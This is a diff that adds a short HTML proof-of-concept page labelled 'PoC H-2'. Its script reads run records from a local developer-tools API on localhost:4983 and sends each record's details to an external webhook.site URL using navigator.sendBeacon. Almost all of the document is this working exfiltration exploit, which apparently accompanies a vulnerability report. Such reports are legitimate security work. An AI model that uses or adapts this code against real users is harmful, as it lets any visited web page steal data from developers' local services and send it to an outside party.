@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>PoC H-2</title></head>
+<body>
+  <button onclick="exploit()">Run</button>
+  <pre id="out"></pre>
+  <script>
+    const DEVTOOLS = 'http://localhost:4983';
+    const WEBHOOK  = 'https://webhook.site/2c971ad5-fda6-495a-ab0b-549b02cb4e80';
+    const log = msg => { document.getElementById('out').textContent += msg + '\n'; };
+
+    async function exploit() {
+      const runs = await fetch(`${DEVTOOLS}/api/runs`).then(r => r.json());
+      log(`found ${runs.length} run(s)`);
+
+      for (const run of runs) {
+        const detail = await fetch(`${DEVTOOLS}/api/runs/${run.id}`).then(r => r.json());
+        navigator.sendBeacon(WEBHOOK, JSON.stringify(detail));
+        log(`sent run ${run.id}`);
+      }
+
+      log('done');
+    }
+  </script>
+</body>
+</html>
